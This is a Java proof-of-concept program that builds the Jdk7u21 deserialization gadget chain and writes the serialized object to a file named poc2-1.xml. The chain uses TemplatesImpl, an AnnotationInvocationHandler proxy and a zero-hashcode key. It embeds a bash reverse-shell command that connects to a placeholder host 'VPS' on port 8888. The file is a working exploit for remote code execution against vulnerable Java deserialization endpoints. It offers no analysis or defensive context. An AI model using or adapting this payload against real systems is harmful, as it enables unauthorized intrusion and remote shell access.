package secondser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import utils.Gadgets;
import utils.Reflections;
import utils.Util;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

public class Jdk7u21 {
    public static void main(String[] args) throws Exception {
        String command = "/bin/bash -i >& /dev/tcp/VPS/8888 0>&1";

        final Object templates = Gadgets.createTemplatesImpl(command);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", TemplatesImpl.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object
        Util.writeFile("./poc2-1.xml", Util.convert(set));
    }
}